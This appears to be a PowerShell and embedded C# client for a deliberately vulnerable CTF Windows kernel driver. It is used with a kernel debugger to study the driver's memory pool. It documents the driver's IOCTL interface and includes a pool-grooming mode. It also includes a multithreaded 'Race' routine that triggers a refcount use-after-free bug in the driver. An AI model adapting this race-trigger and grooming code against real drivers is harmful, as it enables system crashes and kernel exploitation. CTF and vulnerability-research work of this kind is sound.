<#
.SYNOPSIS
    Driver client for the MessageManager CTF driver (\\.\MessageDevice).

.DESCRIPTION
    Runs on the *target* VM, out-of-band from the kernel debug session. windbg-mcp drives
    the debugger; it cannot issue DeviceIoControl itself, so this is the other half of the
    loop: it exercises the driver while the debugger observes the pool.

    The driver exposes four METHOD_BUFFERED IOCTLs (DeviceType 0x22, FILE_ANY_ACCESS):

      0x222000  Create()            -> ULONG id            (OutputBufferLength >= 4)
      0x222004  Delete(ULONG id)                           (InputBufferLength  >= 4)
      0x222008  SetData(id, len, data)                     (see layout below)
      0x22200C  Flush(ULONG sel)    sel: 0 = small list, 1 = large list

    SetData input layout (note the *unaligned* 64-bit length at +4):

        +0x00  ULONG      Id
        +0x04  ULONGLONG  Length      (unaligned)
        +0x0C  UCHAR      Data[Length]

    and its gates: InputBufferLength >= 0xC, Length >= 0x20, Length + 0xC <= 0x3000,
    InputBufferLength >= Length + 0xC. A message whose Length >= 0x200 is linked into the
    "large" list, otherwise the "small" list.

.PARAMETER Op
    Create | Delete | SetData | Flush | Demo | Race | Stress

.EXAMPLE
    .\mm_client.ps1 -Op Demo
    Allocate one message and give it a 0x40-byte body, printing the id. Leaves it alive so
    the debugger can walk it in the pool.

.EXAMPLE
    .\mm_client.ps1 -Op Race -Seconds 20
    Drive the SetData/Flush cross-list race that the unsynchronized list move exposes.
#>
[CmdletBinding()]
param(
    [Parameter(Mandatory = $true)]
    [ValidateSet('Create', 'Delete', 'SetData', 'Flush', 'Demo', 'Race', 'Stress')]
    [string] $Op,

    [uint32] $Id = 0,
    [int]    $Length = 0x40,
    [byte]   $Fill = 0x41,
    [uint32] $Sel = 0,
    [int]    $Seconds = 15,
    [int]    $Threads = 4,
    [string] $Device = '\\.\MessageDevice'
)

Set-StrictMode -Version Latest
$ErrorActionPreference = 'Stop'

Add-Type -Namespace MM -Name Native -MemberDefinition @'
    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true, CharSet = System.Runtime.InteropServices.CharSet.Unicode)]
    public static extern System.IntPtr CreateFileW(
        string lpFileName, uint dwDesiredAccess, uint dwShareMode, System.IntPtr lpSecurityAttributes,
        uint dwCreationDisposition, uint dwFlagsAndAttributes, System.IntPtr hTemplateFile);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool DeviceIoControl(
        System.IntPtr hDevice, uint dwIoControlCode,
        byte[] lpInBuffer, uint nInBufferSize,
        byte[] lpOutBuffer, uint nOutBufferSize,
        out uint lpBytesReturned, System.IntPtr lpOverlapped);

    [System.Runtime.InteropServices.DllImport("kernel32.dll", SetLastError = true)]
    public static extern bool CloseHandle(System.IntPtr hObject);
'@

$IOCTL_CREATE  = [uint32] 0x222000
$IOCTL_DELETE  = [uint32] 0x222004
$IOCTL_SETDATA = [uint32] 0x222008
$IOCTL_FLUSH   = [uint32] 0x22200C

# NB: PowerShell parses an 8-digit hex literal as a *signed* Int32, so 0xC0000000 becomes
# -1073741824 and casting it to [uint32] throws. Write the value in decimal instead.
$GENERIC_RW    = [uint32] 3221225472   # GENERIC_READ | GENERIC_WRITE
$FILE_SHARE_RW = [uint32] 3
$OPEN_EXISTING = [uint32] 3
$INVALID       = [System.IntPtr] (-1)

function Open-Device {
    $h = [MM.Native]::CreateFileW($Device, $GENERIC_RW, $FILE_SHARE_RW,
        [System.IntPtr]::Zero, $OPEN_EXISTING, 0, [System.IntPtr]::Zero)
    if ($h -eq $INVALID) {
        $e = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
        throw ("CreateFile('{0}') failed: {1} (0x{1:x8}) - {2}" -f $Device, $e,
            ([System.ComponentModel.Win32Exception] $e).Message)
    }
    return $h
}

function Invoke-Ioctl($h, [uint32] $code, [byte[]] $inBuf, [int] $outLen) {
    if ($null -eq $inBuf) { $inBuf = New-Object byte[] 0 }
    $outBuf = if ($outLen -gt 0) { New-Object byte[] $outLen } else { $null }
    [uint32] $ret = 0
    $ok = [MM.Native]::DeviceIoControl($h, $code, $inBuf, [uint32] $inBuf.Length,
        $outBuf, [uint32] $outLen, [ref] $ret, [System.IntPtr]::Zero)
    $err = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
    return [pscustomobject]@{ Ok = $ok; Error = $err; Returned = $ret; Output = $outBuf }
}

function New-Message($h) {
    $r = Invoke-Ioctl $h $IOCTL_CREATE $null 4
    if (-not $r.Ok) { throw ("Create failed: Win32 {0}" -f $r.Error) }
    return [BitConverter]::ToUInt32($r.Output, 0)
}

function Remove-Message($h, [uint32] $id) {
    $r = Invoke-Ioctl $h $IOCTL_DELETE ([BitConverter]::GetBytes($id)) 0
    return $r
}

# Builds the SetData input buffer: Id (4) | Length (8, unaligned) | Data[Length]
function New-SetDataBuffer([uint32] $id, [int] $len, [byte] $fill) {
    $buf = New-Object byte[] ($len + 0xC)
    [Array]::Copy([BitConverter]::GetBytes($id), 0, $buf, 0, 4)
    [Array]::Copy([BitConverter]::GetBytes([uint64] $len), 0, $buf, 4, 8)
    for ($i = 0; $i -lt $len; $i++) { $buf[0xC + $i] = $fill }
    return $buf
}

function Set-MessageData($h, [uint32] $id, [int] $len, [byte] $fill) {
    $r = Invoke-Ioctl $h $IOCTL_SETDATA (New-SetDataBuffer $id $len $fill) 0
    return $r
}

function Clear-List($h, [uint32] $sel) {
    return Invoke-Ioctl $h $IOCTL_FLUSH ([BitConverter]::GetBytes($sel)) 0
}

# ---------------------------------------------------------------------------

$h = Open-Device
Write-Host ("Opened {0}" -f $Device) -ForegroundColor DarkGray

try {
    switch ($Op) {
        'Create' {
            $newId = New-Message $h
            Write-Host ("Create -> id = 0x{0:x}" -f $newId) -ForegroundColor Green
        }

        'Delete' {
            $r = Remove-Message $h $Id
            if ($r.Ok) { Write-Host ("Delete(0x{0:x}) -> SUCCESS" -f $Id) -ForegroundColor Green }
            else       { Write-Host ("Delete(0x{0:x}) -> Win32 {1}" -f $Id, $r.Error) -ForegroundColor Yellow }
        }

        'SetData' {
            $r = Set-MessageData $h $Id $Length $Fill
            if ($r.Ok) {
                Write-Host ("SetData(0x{0:x}, len=0x{1:x}) -> SUCCESS  [{2} list]" -f `
                    $Id, $Length, $(if ($Length -ge 0x200) { 'large' } else { 'small' })) -ForegroundColor Green
            } else {
                Write-Host ("SetData(0x{0:x}, len=0x{1:x}) -> Win32 {2}" -f $Id, $Length, $r.Error) -ForegroundColor Yellow
            }
        }

        'Flush' {
            $r = Clear-List $h $Sel
            Write-Host ("Flush({0}) -> {1}" -f $Sel, $(if ($r.Ok) { 'SUCCESS' } else { "Win32 $($r.Error)" })) `
                -ForegroundColor $(if ($r.Ok) { 'Green' } else { 'Yellow' })
        }

        # One message, one body. Leaves it alive and linked so the debugger can find the
        # Tgsm / Tfub allocations and walk the object.
        'Demo' {
            $newId = New-Message $h
            Write-Host ("Create  -> id = 0x{0:x}" -f $newId) -ForegroundColor Green
            $r = Set-MessageData $h $newId $Length $Fill
            Write-Host ("SetData -> len = 0x{0:x}, fill = 0x{1:x2}, list = {2}, {3}" -f `
                $Length, $Fill, $(if ($Length -ge 0x200) { 'large' } else { 'small' }),
                $(if ($r.Ok) { 'SUCCESS' } else { "Win32 $($r.Error)" })) -ForegroundColor Green
            Write-Host ""
            Write-Host "Message is alive and linked. In the debugger:" -ForegroundColor Cyan
            Write-Host "    !poolused 2 Tgsm      # message objects (NonPaged, 0x68)" -ForegroundColor Cyan
            Write-Host "    !poolfind Tgsm        # locate them" -ForegroundColor Cyan
            Write-Host ("    dq MessageManager+0x3150 L2   # small list head" ) -ForegroundColor Cyan
        }

        # Allocate a spread of messages across both lists, so the pool has a population
        # worth looking at (grooming / tag census material).
        'Stress' {
            $ids = New-Object System.Collections.ArrayList
            for ($i = 0; $i -lt $Threads; $i++) {
                $newId = New-Message $h
                [void] $ids.Add($newId)
                $len = if ($i % 2 -eq 0) { 0x40 } else { 0x400 }
                [void] (Set-MessageData $h $newId $len ([byte](0x41 + $i)))
                Write-Host ("  id 0x{0:x}  len 0x{1:x}  ({2})" -f $newId, $len,
                    $(if ($len -ge 0x200) { 'large' } else { 'small' }))
            }
            Write-Host ("Allocated {0} messages." -f $ids.Count) -ForegroundColor Green
        }

        # The bug: SetData moves a message between the small and large lists while holding
        # only the per-message mutex - never the *source* list's lock - and Delete/Flush
        # drop the refcount and free without that per-message mutex. Racing a length
        # oscillation against Flush corrupts the refcount and frees a message that a live
        # handle still points at.
        'Race' {
            Write-Host ("Racing SetData(list move) against Flush for {0}s on {1} threads..." -f $Seconds, $Threads) -ForegroundColor Yellow
            Write-Host "If the target bugchecks, the debugger will break in." -ForegroundColor Yellow

            $csharp = @'
using System;
using System.Runtime.InteropServices;
using System.Threading;

public class MMRace {
    [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Unicode)]
    static extern IntPtr CreateFileW(string n, uint a, uint s, IntPtr sa, uint c, uint f, IntPtr t);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool DeviceIoControl(IntPtr h, uint code, byte[] inb, uint inl,
                                       byte[] outb, uint outl, out uint ret, IntPtr ov);
    [DllImport("kernel32.dll", SetLastError = true)]
    static extern bool CloseHandle(IntPtr h);

    const uint CREATE = 0x222000, DELETE = 0x222004, SETDATA = 0x222008, FLUSH = 0x22200C;

    static IntPtr Open(string dev) {
        IntPtr h = CreateFileW(dev, 0xC0000000, 3, IntPtr.Zero, 3, 0, IntPtr.Zero);
        if (h == (IntPtr)(-1)) throw new Exception("CreateFile failed: " + Marshal.GetLastWin32Error());
        return h;
    }

    static byte[] SetBuf(uint id, int len, byte fill) {
        byte[] b = new byte[len + 0xC];
        Buffer.BlockCopy(BitConverter.GetBytes(id), 0, b, 0, 4);
        Buffer.BlockCopy(BitConverter.GetBytes((ulong)len), 0, b, 4, 8);
        for (int i = 0; i < len; i++) b[0xC + i] = fill;
        return b;
    }

    public static void Run(string dev, int seconds, int threads) {
        IntPtr h = Open(dev);
        uint ret;
        DateTime stop = DateTime.UtcNow.AddSeconds(seconds);
        long iterations = 0;

        // A pool of live message ids whose lengths we oscillate across the 0x200 boundary,
        // so every SetData takes the unlocked cross-list unlink path.
        int n = 32;
        uint[] ids = new uint[n];
        for (int i = 0; i < n; i++) {
            byte[] o = new byte[4];
            DeviceIoControl(h, CREATE, new byte[0], 0, o, 4, out ret, IntPtr.Zero);
            ids[i] = BitConverter.ToUInt32(o, 0);
            DeviceIoControl(h, SETDATA, SetBuf(ids[i], 0x40, 0x41), (uint)(0x40 + 0xC), null, 0, out ret, IntPtr.Zero);
        }
        Console.WriteLine("seeded {0} messages, first id = 0x{1:x}", n, ids[0]);

        Thread[] ts = new Thread[threads];
        for (int t = 0; t < threads; t++) {
            int me = t;
            ts[t] = new Thread(delegate() {
                IntPtr th = Open(dev);
                uint r;
                Random rnd = new Random(me * 7919 + 13);
                while (DateTime.UtcNow < stop) {
                    uint id = ids[rnd.Next(n)];
                    if ((me & 1) == 0) {
                        // oscillate across the small/large threshold -> unlocked list move
                        int len = (rnd.Next(2) == 0) ? 0x40 : 0x400;
                        DeviceIoControl(th, SETDATA, SetBuf(id, len, (byte)0x42),
                                        (uint)(len + 0xC), null, 0, out r, IntPtr.Zero);
                    } else {
                        // concurrently tear the lists down under their own lock
                        uint sel = (uint)rnd.Next(2);
                        DeviceIoControl(th, FLUSH, BitConverter.GetBytes(sel), 4, null, 0, out r, IntPtr.Zero);
                    }
                    Interlocked.Increment(ref iterations);
                }
                CloseHandle(th);
            });
            ts[t].Start();
        }
        foreach (Thread x in ts) x.Join();
        Console.WriteLine("done, {0} iterations", iterations);
        CloseHandle(h);
    }
}
'@
            Add-Type -TypeDefinition $csharp -Language CSharp
            [MMRace]::Run($Device, $Seconds, $Threads)
        }
    }
}
finally {
    [void][MM.Native]::CloseHandle($h)
}
